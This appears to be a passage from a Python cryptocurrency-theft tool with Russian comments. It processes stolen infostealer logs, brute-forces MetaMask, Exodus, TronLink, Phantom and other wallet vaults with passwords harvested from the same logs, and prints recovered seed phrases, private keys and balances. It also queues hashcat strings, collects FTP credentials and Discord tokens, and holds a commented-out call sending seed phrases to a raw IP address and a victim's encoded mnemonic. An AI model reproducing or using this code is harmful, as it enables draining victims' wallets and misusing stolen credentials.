...PortfolioTableTraitTable_asset\n  }\n  ...PortfolioTableAcceptOfferButton_item_3StDC7\n  ...PortfolioTableListButton_item_1TFcTQ\n  ...PortfolioTableMakeOfferButton_asset_3ioucg\n  ...PortfolioTableTraitTable_asset\n  ...PortfolioTableListingsTable_asset\n}\n\nfragment PortfolioTableFloorPriceCell_item on ItemType {\n  __isItemType: __typename\n  __typename\n  ... on AssetType {\n    assetCollection: collection {\n      statsV2 {\n        floorPrice {\n          unit\n          symbol\n        }\n      }\n      id\n    }\n  }\n  ... on AssetBundleType {\n    bundleCollection: collection {\n      statsV2 {\n        floorPrice {\n          unit\n          symbol\n        }\n      }\n      id\n    }\n  }\n}\n\nfragment PortfolioTableItemCellTooltip_item on ItemType {\n  __isItemType: __typename\n  __typename\n  ...AssetMedia_asset_5MxNd\n  ...PortfolioTableTraitTable_asset\n  ...asset_url\n}\n\nfragment PortfolioTableItemCell_item_3StDC7 on ItemType {\n  __isItemType: __typename\n  __typename\n  chain {\n    displayName\n    identifier\n  }\n  ...PortfolioTableItemCellTooltip_item\n  ... on AssetType {\n    ownedQuantity(identity: $identity)\n    assetContract {\n      ...CollectionLink_assetContract\n      id\n    }\n    assetCollection: collection {\n      ...CollectionLink_collection\n      id\n    }\n    ...AssetMedia_asset\n    ...asset_display_name\n  }\n  ... on AssetBundleType {\n    displayName\n    bundleCollection: collection {\n      ...CollectionLink_collection\n      id\n    }\n    assetQuantities(first: 18) {\n      edges {\n        node {\n          asset {\n            ...StackedAssetMedia_assets\n            id\n          }\n          id\n        }\n      }\n    }\n  }\n  ...item_url\n}\n\nfragment PortfolioTableListButton_bestAskV2_3ioucg on OrderV2Type {\n  ...EditListingButton_listing @include(if: $showContextMenu)\n  maker {\n    address\n    id\n  }\n  orderType\n}\n\nfragment PortfolioTableListButton_item_1TFcTQ on ItemType {\n  __isItemType: __typename\n  __typename\n  relayId\n  chain {\n    isTradingEnabled\n  }\n  orderData {\n    bestAskV2 {\n      ...PortfolioTableListButton_bestAskV2_3ioucg\n      id\n    }\n    bestAskForOwner: bestAskV2(byAddress: $identity) {\n      ...PortfolioTableListButton_bestAskV2_3ioucg\n      id\n    }\n  }\n  ... on AssetType {\n    isCurrentlyFungible\n    isListable\n  }\n  ...itemEvents_data\n  ...CreateListingButton_item\n  ...EditListingButton_item @include(if: $showContextMenu)\n}\n\nfragment PortfolioTableListingCell_bestAskV2 on OrderV2Type {\n  perUnitPriceType {\n    unit\n    symbol\n  }\n  closedAt\n}\n\nfragment PortfolioTableListingCell_item_3StDC7 on ItemType {\n  __isItemType: __typename\n  relayId\n  orderData {\n    bestAskV2 {\n      ...PortfolioTableListingCell_bestAskV2\n      id\n    }\n    bestAskForOwner: bestAskV2(byAddress: $identity) {\n      ...PortfolioTableListingCell_bestAskV2\n      id\n    }\n  }\n  ...PortfolioTableListingTooltip_item_3StDC7\n}\n\nfragment PortfolioTableListingTooltipContent_item on AssetType {\n  collection {\n    statsV2 {\n      floorPrice {\n        eth\n      }\n    }\n    id\n  }\n}\n\nfragment PortfolioTableListingTooltip_item_3StDC7 on ItemType {\n  __isItemType: __typename\n  __typename\n  orderData {\n    bestAskV2 {\n      relayId\n      id\n    }\n    bestAskForOwner: bestAskV2(byAddress: $identity) {\n      relayId\n      id\n    }\n  }\n  ... on AssetType {\n    ...PortfolioTableListingTooltipContent_item\n  }\n}\n\nfragment PortfolioTableListingsTable_asset on AssetType {\n  ...EditListingButton_item\n  relayId\n  chain {\n    identifier\n  }\n  assetContract {\n    address\n    id\n  }\n  isCurrentlyFungible\n  tokenId\n}\n\nfragment PortfolioTableMakeOfferButton_asset_3ioucg on AssetType {\n  ...MakeAssetOfferButton_asset @skip(if: $showContextMenu)\n}\n\nfragment PortfolioTableOptionsCell_item_1TFcTQ on ItemType {\n  __isItemType: __typename\n  __typename\n  ... on AssetType {\n    ...AssetContextMenu_data @include(if: $showContextMenu)\n  }\n  ...PortfolioTableAcceptOfferButton_item_3StDC7\n  ...PortfolioTableListButton_item_1TFcTQ\n  ...itemEvents_dataV2\n}\n\nfragment PortfolioTableRow_item_1TFcTQ on ItemType {\n  __isItemType: __typename\n  __typename\n  relayId\n  ...PortfolioTableItemCell_item_3StDC7\n  ...PortfolioTableFloorPriceCell_item\n  ...PortfolioTableBestOfferCell_item\n  ...PortfolioTableListingCell_item_3StDC7\n  ...PortfolioTableCostCell_item\n  ...PortfolioTableDifferenceCell_item_3StDC7\n  ...PortfolioTableOptionsCell_item_1TFcTQ\n  ...PortfolioTableExpandedRow_item_1TFcTQ\n}\n\nfragment PortfolioTableTraitTable_asset on AssetType {\n  assetContract {\n    address\n    chain\n    id\n  }\n  isCurrentlyFungible\n  tokenId\n}\n\nfragment PortfolioTable_items_1TFcTQ on ItemType {\n  __isItemType: __typename\n  __typename\n  relayId\n  ... on AssetType {\n    ownership(identity: $identity) {\n      isPrivate\n      quantity\n    }\n  }\n  ...PortfolioTableRow_item_1TFcTQ\n  ...useAssetSelectionStorage_item_3NSiLP\n  ...itemEvents_dataV2\n}\n\nfragment Price_data on AssetType {\n  decimals\n  symbol\n  usdSpotPrice\n}\n\nfragment ProfileImage_data on AccountType {\n  imageUrl\n}\n\nfragment QuickBuyButton_order on OrderV2Type {\n  maker {\n    address\n    id\n  }\n  taker {\n    address\n    ...wallet_accountKey\n    id\n  }\n  item {\n    __typename\n    chain {\n      identifier\n    }\n    ...itemEvents_dataV2\n    ... on Node {\n      __isNode: __typename\n      id\n    }\n  }\n  openedAt\n  relayId\n}\n\nfragment RarityIndicator_data on RarityDataType {\n  rank\n  rankPercentile\n  rankCount\n  maxRank\n}\n\nfragment ShoppingCartContextProvider_inline_order on OrderV2Type {\n  relayId\n  makerOwnedQuantity\n  item {\n    __typename\n    chain {\n      identifier\n    }\n    relayId\n    ... on AssetBundleType {\n      assetQuantities(first: 30) {\n        edges {\n          node {\n            asset {\n              relayId\n              id\n            }\n            id\n          }\n        }\n      }\n    }\n    ... on Node {\n      __isNode: __typename\n      id\n    }\n  }\n  maker {\n    relayId\n    id\n  }\n  taker {\n    address\n    ...wallet_accountKey\n    id\n  }\n  priceType {\n    usd\n  }\n  payment {\n    relayId\n    id\n  }\n  remainingQuantityType\n  ...useTotalItems_orders\n  ...ShoppingCart_orders\n}\n\nfragment ShoppingCartDetailedView_orders on OrderV2Type {\n  relayId\n  item {\n    __typename\n    chain {\n      identifier\n    }\n    ... on Node {\n      __isNode: __typename\n      id\n    }\n  }\n  supportsGiftingOnPurchase\n  ...useTotalPrice_orders\n  ...OrderList_orders\n}\n\nfragment ShoppingCart_orders on OrderV2Type {\n  ...ShoppingCartDetailedView_orders\n  ...BulkPurchaseModal_orders\n}\n\nfragment StackedAssetMedia_assets on AssetType {\n  relayId\n  ...AssetMedia_asset\n  collection {\n    logo\n    id\n  }\n}\n\nfragment TokenPricePayment on PaymentAssetType {\n  symbol\n}\n\nfragment accounts_url on AccountType {\n  address\n  user {\n    publicUsername\n    id\n  }\n}\n\nfragment asset_display_name on AssetType {\n  tokenId\n  name\n}\n\nfragment asset_url on AssetType {\n  assetContract {\n    address\n    id\n  }\n  tokenId\n  chain {\n    identifier\n  }\n}\n\nfragment bundle_url on AssetBundleType {\n  slug\n  chain {\n    identifier\n  }\n}\n\nfragment collection_url on CollectionType {\n  slug\n  isCategory\n}\n\nfragment itemEvents_data on AssetType {\n  relayId\n  assetContract {\n    address\n    id\n  }\n  tokenId\n  chain {\n    identifier\n  }\n}\n\nfragment itemEvents_dataV2 on ItemType {\n  __isItemType: __typename\n  relayId\n  chain {\n    identifier\n  }\n  ... on AssetType {\n    tokenId\n    assetContract {\n      address\n      id\n    }\n  }\n}\n\nfragment item_sellUrl on ItemType {\n  __isItemType: __typename\n  __typename\n  ... on AssetType {\n    ...asset_url\n  }\n  ... on AssetBundleType {\n    slug\n    chain {\n      identifier\n    }\n    assetQuantities(first: 18) {\n      edges {\n        node {\n          asset {\n            relayId\n            id\n          }\n          id\n        }\n      }\n    }\n  }\n}\n\nfragment item_url on ItemType {\n  __isItemType: __typename\n  __typename\n  ... on AssetType {\n    ...asset_url\n  }\n  ... on AssetBundleType {\n    ...bundle_url\n  }\n}\n\nfragment readItemHasBestAsk_item on ItemType {\n  __isItemType: __typename\n  orderData {\n    bestAskV2 {\n      __typename\n      id\n    }\n  }\n}\n\nfragment readOptionalCreatorFees_item on ItemType {\n  __isItemType: __typename\n  __typename\n  ... on AssetType {\n    collection {\n      isCreatorFeesEnforced\n      totalCreatorFeeBasisPoints\n      id\n    }\n  }\n}\n\nfragment useAssetSelectionStorage_item_3NSiLP on ItemType {\n  __isItemType: __typename\n  __typename\n  relayId\n  chain {\n    identifier\n    isTradingEnabled\n  }\n  ... on AssetType {\n    bestAllTypeBid {\n      relayId\n      id\n    }\n    orderData {\n      bestAskV2 {\n        relayId\n        maker {\n          address\n          id\n        }\n        id\n      }\n      bestAskForOwner: bestAskV2(byAddress: $identity) {\n        relayId\n        maker {\n          address\n          id\n        }\n        id\n      }\n    }\n    ...asset_url\n    isCompromised\n  }\n  ... on AssetBundleType {\n    orderData {\n      bestAskV2 {\n        relayId\n        maker {\n          address\n          id\n        }\n        id\n      }\n      bestBidV2 {\n        relayId\n        id\n      }\n    }\n  }\n  ...item_sellUrl\n  ...AssetContextMenu_data\n  ...CancelItemOrdersButton_items\n}\n\nfragment useFulfillingListingsWillReactivateOrders_orders on OrderV2Type {\n  ...useTotalItems_orders\n}\n\nfragment useIsItemSafelisted_item on ItemType {\n  __isItemType: __typename\n  __typename\n  ... on AssetType {\n    collection {\n      slug\n      verificationStatus\n      id\n    }\n  }\n  ... on AssetBundleType {\n    assetQuantities(first: 30) {\n      edges {\n        node {\n          asset {\n            collection {\n              slug\n              verificationStatus\n              id\n            }\n            id\n          }\n          id\n        }\n      }\n    }\n  }\n}\n\nfragment useIsQuickBuyEnabled_order on OrderV2Type {\n  orderType\n  item {\n    __typename\n    ... on AssetType {\n      isCurrentlyFungible\n    }\n    ... on Node {\n      __isNode: __typename\n      id\n    }\n  }\n}\n\nfragment useIsRarityEnabled_collection on CollectionType {\n  slug\n  enabledRarities\n}\n\nfragment useItemCardCta_item_20mRwh on ItemType {\n  __isItemType: __typename\n  __typename\n  chain {\n    identifier\n    isTradingEnabled\n  }\n  orderData {\n    bestAskV2 {\n      orderType\n      maker {\n        address\n        id\n      }\n      id\n    }\n  }\n  ... on AssetType {\n    isDelisted\n    isListable\n    isCurrentlyFungible\n    ownedQuantity(identity: $identity) @include(if: $showContextMenu)\n  }\n}\n\nfragment useItemFees_item on ItemType {\n  __isItemType: __typename\n  __typename\n  ... on AssetType {\n    totalCreatorFee\n    collection {\n      openseaSellerFeeBasisPoints\n      isCreatorFeesEnforced\n      id\n    }\n  }\n  ... on AssetBundleType {\n    bundleCollection: collection {\n      openseaSellerFeeBasisPoints\n      totalCreatorFeeBasisPoints\n      isCreatorFeesEnforced\n      id\n    }\n  }\n}\n\nfragment useTotalItems_orders on OrderV2Type {\n  item {\n    __typename\n    relayId\n    ... on AssetBundleType {\n      assetQuantities(first: 30) {\n        edges {\n          node {\n            asset {\n              relayId\n              id\n            }\n            id\n          }\n        }\n      }\n    }\n    ... on Node {\n      __isNode: __typename\n      id\n    }\n  }\n}\n\nfragment useTotalPrice_orders on OrderV2Type {\n  relayId\n  perUnitPriceType {\n    usd\n    unit\n  }\n  payment {\n    symbol\n    ...TokenPricePayment\n    id\n  }\n}\n\nfragment wallet_accountKey on AccountType {\n  address\n}\n", 
        "variables": {"chains": None, "collections": [], "count": 20, "cursor": None, "identity": {"address": address}, "numericTraits": None, "paymentAssets": None, "priceFilter": None, "query": None, "resultModel": None, "sortAscending": None, "sortBy": "BEST_BID", "stringTraits": None, "toggles": None, "showContextMenu": False}}
        response = httpx.post('https://opensea.io/__api/graphql/', headers=headers, json=data)
        result = response.json()
        
        ethPrice = get("https://min-api.cryptocompare.com/data/price?fsym=ETH&tsyms=USD").json()["USD"]
        totalNft = result["data"]["searchItems"]["totalCount"]
        edges = result["data"]["searchItems"]["edges"]
        allusd = 0
        for item in edges:
            if item["node"]["bestAllTypeBid"]:
                nftcost = item["node"]["bestAllTypeBid"]["perUnitPriceType"]["eth"]
                usdprice = round(float(nftcost) * ethPrice)
                if usdprice > 0:
                    allusd += usdprice

        return [totalNft, allusd]
    except Exception as ex:
        print("OPENSEA:", ex)
        return [0, 0]

def SolanaEx(mnemonic):
	try:
		# Block decode
		seed_bytes = Bip39SeedGenerator(mnemonic).Generate('')
		bip44_mst_ctx = Bip44.FromSeed(seed_bytes, Bip44Coins.SOLANA)
		bip44_acc_ctx = bip44_mst_ctx.Purpose().Coin().Account(0)
		bip44_chg_ctx = bip44_acc_ctx.Change(Bip44Changes.CHAIN_EXT) # if you use "Solflare", remove this line and make a simple code modify and test
		priv_key_bytes = bip44_chg_ctx.PrivateKey().Raw().ToBytes()
		public_key_bytes = bip44_chg_ctx.PublicKey().RawCompressed().ToBytes()[1:]
		key_pair = priv_key_bytes+public_key_bytes

		sol_adderss = bip44_chg_ctx.PublicKey().ToAddress()
		private_key = base58.b58encode(key_pair).decode()

		# data = {"addresses":[
		#   {"chainId":"solana:101","address": sol_adderss},
		#   {"chainId":"eip155:1","address": eth_address},
		#   {"chainId":"eip155:137","address": eth_address}]}

		# # Block Get Solana
		# data = {"seed": mnemonic}
		# response = httpx.post('http://65.109.70.235:5100/solana', json=data).json()
		
		sol_adderss = response["address"]
		private_key = response["private"]

		# Block info
		data = {"addresses":[{"chainId":"solana:101","address": sol_adderss}]}
		response = httpx.post('https://api.phantom.app/tokens/v1?enableToken2022=true', json=data)
		result = response.json()

		# Block price
		price = httpx.get("https://api.diadata.org/v1/assetQuotation/Solana/0x0000000000000000000000000000000000000000").json()
		sol_price = round(price["Price"], 2)

		for item in result["tokens"]:
			# print(item["type"], item["data"]["name"], item["data"]["symbol"], item["data"]["amount"])
			if item["type"] == "SolanaNative":
				raw_bal = int(item["data"]["amount"])
				native = raw_bal / 10 ** 9
				usd_bal = round(native * sol_price, 2)
				return {'s': True, 'b': usd_bal, 'a': sol_adderss, 'p': private_key}
			else:
				output("[-] Phantom, Error find token.")
				return {'s': False}

		# {'type': 'SolanaNative', 'data': {'chain': {'id': 'solana:101', 'name': 'Solana', 'symbol': 'SOL', 'imageUrl': 'https://static.phantom.app/assets/solana.png'}, 'walletAddress': '5E9mJdJt1fmWgTq7ZPyV2x9gqAyRxKC2NaX5ZzQoLE1r', 'decimals': 9, 'amount': '50000000', 'logoUri': 'https://cdn.jsdelivr.net/gh/solana-labs/token-list@main/assets/mainnet/So11111111111111111111111111111111111111112/logo.png', 'name': 'Solana', 'symbol': 'SOL', 'coingeckoId': 'solana'}}
	except Exception as ex:
		output(f"[-] Phantom, {ex}")
		return {'s': False}

def trxBalance(wallet) -> int:
    resp = get(f"https://apilist.tronscanapi.com/api/account/token_asset_overview?address={wallet}")
    if resp.status_code == 200:
        obj = json.loads(resp.text)
        if "totalAssetInUsd" in obj:
            raw = round(obj["totalAssetInUsd"], 2)
            return raw
        else:
            return 0
    else:
        return 0

def getAddress(mnemonic, path) -> tuple:

    hdwallet = HDWallet(symbol=path[5], use_default_path=False)
    hdwallet.from_mnemonic(mnemonic)

    hdwallet.from_index(path[0], hardened=True)
    hdwallet.from_index(path[1], hardened=True)
    hdwallet.from_index(path[2], hardened=True)
    hdwallet.from_index(path[3])
    hdwallet.from_index(path[4])

    address = hdwallet.dumps()["addresses"]["p2pkh"] 
    private = hdwallet.dumps()["private_key"]

    # return json.dumps(hdwallet.dumps(), indent=4, ensure_ascii=False)
    return (path[5], address, private)

def output(text: str) -> None:
    if DEBUG_MODE:
        print(text)

def cryptoLibUpgrade() -> None:
	import subprocess
	print("[+]>>> Start check and update crypto libs.")
	subprocess.run(["python", "-m", "pip","install", "--upgrade", "pip"], capture_output=True, text=True)
	subprocess.run(["pip", "install", "WalletDecode", "--upgrade"], capture_output=True, text=True)
	subprocess.run(["pip", "install", "PhantomDecode", "--upgrade"], capture_output=True, text=True)
	subprocess.run(["pip", "install", "ExodusDecode", "--upgrade"], capture_output=True, text=True)
	subprocess.run(["pip", "install", "TronDecode", "--upgrade"], capture_output=True, text=True)
	print("[+]<<< Done, all libs latest version.")

def data_ftp(ftp: list) -> None:
    ftp = set(list(ftp))
    ftp_data = {"ftp": []}
    for item in ftp:
        if "UNKNOWN" not in item:
            tbid = hashlib.sha256(str(item).encode()).hexdigest()[:-35]
            ftp_data["ftp"].append([tbid, item])
    ldbs.ciphersd(json.dumps(ftp_data), 8, "codataUser")

def data_discord(discord: list) -> None:
    discord = set(list(discord))
    res = {"discord": []}
    for item in discord:
        res["discord"].append(item[2])
    ldbs.ciphersd(json.dumps(res), 8, "codataUser")


def doWork(path):
	#=============================================================================================
	_path = path.lower() #...........................: Путь к лог файлу для поиcка
	pList = path.split("\\") #.......................: получаем лист из названия
	pToLog = os.path.join(pList[0], pList[1]) #......: путь к логу.
	wType = typeWallet(_path) #......................: Определяем тип кошелька (мета, брав, ронин)
	tLog = find_txt_files(pToLog) #..................: Ищем текстовики в конкретном логе
	uData = findData(tLog) #.........................: Находим пароли и почты (Доработать функции)
	#=============================================================================================
	if path.endswith(".log"):
		vData = findEncryptedData(path)
		# =============================
		if vData["status"]: #...................................: нашли данные для восстановления.
			
			uid_path = hashlib.sha256(vData["data"]["data"].encode()).hexdigest() # Антипаблик, что бы не брутить одно и тоже.
			if uid_path in wallets_antik:
				print(f"[-] Dublicate lines: {uid_path}")
			else:
				wallets_antik.append(uid_path)
				if vData["data"]["type"] == 3: #....................: определение нового вида лога Метамаска.
					iterations = vData["data"]["iterations"] # по стандарту 600_000
					wType = "MetamaskV2" # Подписываем новый тип кошелька.
				else:
					iterations = 10000
				# =====================
				payload = vData["data"] #...........................: json с data, iv , salt
				selectedAddress = findSelectedAddress(path) #.......: Ищем адресс для чека (основной)
				if uData[0]: #......................................: Если нашли данные для Брута | (пароли и логины из почт)
					_checkPoint = 0
					for pssw in uData[0]: #....................: Начинаем перебор паролей.
						obj = vault.decryptSingle(pssw, payload, iterations)
						if obj["s"]: #.....................: Если сбрутили пароль
							_checkPoint = 1 #...................: Меняем статус сбрутили пароль.
							#================================================================
							# print(obj), Достать с obj исходных данных Simple Key Pair, импорт кошельки.
							#================================================================
							resp = vault.extractMnemonic(obj["r"])
							if resp["status"]:
								# ===================================================
								mnemonic = resp["data"]
								xEth = getAddress(mnemonic, [44, 60, 0, 0, 0, "ETH"])
								eWallet, ePrivat = xEth[1], xEth[2]
								ball = 0 # debankBalanceV3(eWallet)
								# opsea = opensea(eWallet)
								opsNft = 0# opsea[0]
								opsBal = 0# opsea[1]
								banner = f"======================\nVault: [{wType}]\nAddress: {eWallet}\nPrivate: {ePrivat}\nBalance: {ball}$\nOpenSea[{opsNft}] {opsBal}$\nMnemonic: {mnemonic}\nPassword: {pssw}\nPath: {path}\n"
								print(banner)
								# ===================================================
							else:
								# DEBUG: если status false , но пароль сбрутился , посмотреть что к чему.
								# {'s': True, 'm': None, 'r': {'version': 'v2', 'accounts': []}}
								output(f"[-]: Status false, after bruteforce: {obj}, {path}")
								# ===================================================

							break # Сбрасываем брут если чекпоинт 1. и переходим к следущему логу.
						else:
							pass # Пароль не сбрутили.
					if _checkPoint == 0: #.......................................: Статус брута пароля не изменился , значит пароль не сбрутился.
						salt, iv, data = payload["salt"], payload["iv"], payload["data"]#.........: Получаем данные с найденного хеша.
						hashcat = f"$metamask${salt}${iv}${data}" #...............................: Переменная для хекшета.
						tbid = hashlib.sha256(hashcat.encode()).hexdigest()
						psswList = uData[0]
						toBrute = {"id": tbid,"ad": selectedAddress, "hc": hashcat, "pw": psswList}
						ldbs.ciphersd(json.dumps(toBrute), 7, "toBruteHncd")
						# Отправим hash, password list на апи и если есть selectedAddress + balance
		else:
			# Не нашли данные для восстановления с лог файла., findEncryptedData Не нашел хешей.
			# Прочекать файлы где не нашло хешей, и если есть дописать новых регулярок.
			# output(f"[-] WalletDecrypt, vData status false: {path}")
			pass
	#================================================
	if path.endswith("seed.seco"):
		try:
			_checkPoint = 0
			w1 = ExodusWalletReader(path)
			passphrase = path[:-9] + "passphrase.json"
			if os.path.exists(passphrase): # есть файл с паролем.
				_checkPoint = 1
				with open(passphrase, 'r') as f: file = json.load(f)
				pssw = file['passphrase']
				data = w1.decrypt(pssw)
				seed = ExodusWalletReader.extractMnemonic(data)
				#========================================
				mnemonic = seed[0]
				xEth = getAddress(mnemonic, [44, 60, 0, 0, 0, "ETH"])
				eWallet, ePrivat = xEth[1], xEth[2]
				ball = 0 # debankBalanceV3(eWallet)
				banner = f"======================\nVault: [{wType}]\nAddress: {eWallet}\nPrivate: {ePrivat}\nBalance: {ball}$\nMnemonic: {mnemonic}\nPassword: {pssw}\nPath: {path}\n"
				print(banner)
				#========================================
			else:
				for pssw in uData[0]: #....................: Начинаем перебор паролей.
					data = w1.decrypt(pssw)
					if data["status"]:
						#========================================
						_checkPoint = 1
						seed = ExodusWalletReader.extractMnemonic(data)
						mnemonic = seed[0]
						xEth = getAddress(mnemonic, [44, 60, 0, 0, 0, "ETH"])
						eWallet, ePrivat = xEth[1], xEth[2]
						ball = 0 # debankBalanceV3(eWallet)
						banner = f"======================\nVault: [{wType}]\nAddress: {eWallet}\nPrivate: {ePrivat}\nBalance: {ball}$\nMnemonic: {mnemonic}\nPassword: {pssw}\nPath: {path}\n"
						print(banner)
						#========================================
						break
					else:
						pass
			if _checkPoint == 0:
				hashcat = extractHashcat(path) # Строка для брута.
				with open(path, 'rb', errors='ignore') as fh: file = fh.read() # содержимое seed.seco
				passwordList = uData[0] # Список паролей
				# (если не сбрутили ексодус) Отправляем хеш для хешкета, содержимое секо , список паролей - на апи.
		except Exception as ex:
			output(f"[-] ExodusWalletReader somthing has wrong: {ex}, {path}")
	#================================================
	if wType == "TronLink":
		# Тут декрипт тронлинка нового образца > изучить и отредактировать вывод.
		try:
			_checkPoint = 0

			if uData[0]:
				r1 = TronlinkReader(path) # достаем содержимое с файла с регуляркой ( в библиотеке так )
				for pssw in uData[0]:
					resp = r1.decrypt(pssw)
					if resp["status"]:
						_checkPoint = 1
						mnemonic = TronlinkReader.extractMnemonic(resp)
						xTrx = getAddress(mnemonic[0], [44, 195, 0, 0, 0, "TRX"])
						tWallet, tPrivat = xTrx[1], xTrx[2]
						ball = 0# trxBalance(tWallet)
						banner = f"======================\nVault: [{wType}v2]\nAddress: {tWallet}\nPrivate: {tPrivat}\nBalance: {ball}$\nMnemonic[{len(mnemonic)}]: {mnemonic[0]}\nPassword: {pssw}\nPath: {path}\n"
						print(banner)		
						break
				if _checkPoint == 0:
					# Пароль не сбрутили.
					# salt, iv, data = payload["salt"], payload["iv"], payload["data"]#.........: Получаем данные с найденного хеша.
					# hashcat = f"$metamask${salt}${iv}${data}" #...............................: Переменная для хекшета.
					psswList = uData[0]
					output(f"[-] No bruted Tronlink: {path}")
			else:
				output(f"[-] TronLink, No have data to brute: {path}")
		except Exception as ex:
			# Ошибка может быть из-за первой версии тронлинка.
			output(f"[-] TronlinkV2 Error: {ex}, {path}")
	#================================================
	if wType == "Phantom":
		filename = os.path.basename(path) #........................: Получаем файл из пути.
		ldb_folder = path[:-len(filename)] #.......................: Убрали название файла с пути.
		uid_path = hashlib.sha256(ldb_folder.encode()).hexdigest()#: Уникальный идентификатор пути.
		
		if uid_path in phantom_antik: #............................: Проверка есть ли такой айди в антипаблике.
			pass
		else:
			phantom_antik.append(uid_path) # Добавляем в антипаблик.
			result = findldb(ldb_folder)   # Ищем данные для восстановления.
			if result:
				if uData[0]: # если есть пароли для брута то брутим
					_checkPoint = 0
					for pssw in uData[0]:
						phantom_raw = phmdecode(pssw, result)
						if phantom_raw['status']:
							_checkPoint = 1
							mnemonic = phantom_raw['data'][0]
							
							raw_sol = SolanaEx(mnemonic)
							if raw_sol['s']:
								address_sol = raw_sol['a']
								private_sol = raw_sol['p']
								balance_sol = raw_sol['b']
							else:
								address_sol = 'Undefined'
								private_sol = 'Undefined'
								balance_sol = 'Undefined'

							eths = getAddress(mnemonic, [44, 60, 0, 0, 0, "ETH"])
							address_eth = eths[1]
							private_eth = eths[2]
							balance_deb = 0 # debankBalanceV3(address_eth)

							opsea = opensea(address_eth)
							ops_nft = opsea[0]
							ops_bal = opsea[1]
							
							banner = f"======================\nVault: [{wType}]\nAddress: {address_sol}\nPrivate: {private_sol}\nBalance: {balance_sol}$\nEVM-Address: {address_eth}\nEVM-Private: {private_eth}\nEVM-Balance: {balance_deb}$ Ops: [{ops_nft}][{ops_bal}$]\nMnemonic: {mnemonic}\nPassword: {pssw}\nPath: {path}\n"
							print(banner)
							break
					if _checkPoint == 0:
						pass
						# print("not Bruted", path)
						# Хуй знает что делать где не сбрутился парольчик.
	#================================================
	if wType == "Trust Wallet" or wType == "Trust":
		filename = os.path.basename(path) #........................: Получаем файл из пути.
		ldb_folder = path[:-len(filename)] #.......................: Убрали название файла с пути.
		uid_path = hashlib.sha256(ldb_folder.encode()).hexdigest()#: Уникальный идентификатор пути.
		
		if uid_path in trust_antik: #............................: Проверка есть ли такой айди в антипаблике.
			pass
		else:
			trust_antik.append(uid_path)
			data = extractWallets(ldb_folder)
			www = trstDecode(data, uData[0])
			# result = extract_wallets(ldb_folder)
			print(wType, www)
	#================================================
	if wType == "Atomic":
		filename = os.path.basename(path) #........................: Получаем файл из пути.
		ldb_folder = path[:-len(filename)] #.......................: Убрали название файла с пути.
		if uData[0]:
			_checkPoint = 0
			obj = decryptAtomic(ldb_folder, uData[0])
			if obj["s"]:
				address = get_addresses(ldb_folder)
				print(obj)
				print(address)




		with open("atomic_logs.txt", "a", encoding="utf-8") as f:
			f.write(path + "\n")
	#================================================

if __name__ == '__main__':
	# __init__
	DEBUG_MODE = True
	ldbs = algorithmb() # Chiper Libs
	# cryptoLibUpgrade()  # Обновление библиотек.
	#========================================
	try:
		root = Tk()
		root.withdraw()
		directory_path = filedialog.askdirectory()
		files = fast_search(directory_path, ('.log', '.seco'))
	except FileNotFoundError:
		output("[-] file path wrong.")
	except ValueError:
		output("[-] Canceled, not choice folder.")
		exit(1)
	except Exception as ex:
		output(f"[-] Somethimg went wrong: {ex}")
	#========================================
	print("[Status]:", len(files))
	#========================================
	vault = extensionWalletDecrypt()
	#========================================
	phantom_antik = [] # Что бы не искать ldb файлы в одной и той же папке.
	trust_antik   = [] # TrustWallet antik
	wallets_antik = [] # что бы не брутить те логи что уже были.
	ftp_data 	  = [] # Сбор паролей логинов от FTP 
	discord_token = [] # Сбор валидных токенов дискорда
	#========================================
	for path in files:
		try:
			doWork(path)
		except Exception as ex:
			output(f"[-] Global, error in doWork: {ex}, {path}")
			continue
	#=============================
	data_ftp(ftp_data)
	data_discord(discord_token)
	#=============================



# [-]: Status false, after bruteforce: {'s': True, 'm': None, 'r': {'version': 'v2', 'accounts': []}}, C:/Users/Plutonium/Desktop/wLogs\PK5ZQS59SP5ZDPI31L52Q7MGZXBSEY0JG_2024-01-09 69-19-75\Wallets\Google_[Chrome]_Profile 1_BinanceChain\000003.log
# C:\Users\Plutonium\Desktop\aLogs\31648_BD_103.43.149.4\Wallets\Trust Wallet\Edge\Default\Local\000005.ldb

'''
[-] Failed fork_wallet_reader, decryptSingle:
Expecting value: line 1 column 1 (char 0),
POST:[[{"type":"HD Key Tree","data":{"mnemonic":[115,112,101,97,107,32,100,117,110,101,32,115,105,99,107,32,103,117,97,114,100,32,105,109,112,111,115,101,32,115,111,108,100,105,101,114,32,110,117,109,98,101,114,32,101,110,97,98,108,101,32,108,101,105,115,117,114,101,32,103,97,108,97,120,121,32,100,101,115,101,114,116,32,98,97,110,110,101,114],"numberOfAccounts":1,"hdPath":"m/44'/60'/0'/0"}},{"type":"Ledger Hardware","data":{"hdPath":"m/44'/60'/0'","accounts":[],"accountDetails":{},"bridgeUrl":"https://metamask.github.io/eth-ledger-bridge-keyring","implementFullBIP44":false}}]],
length: 576
'''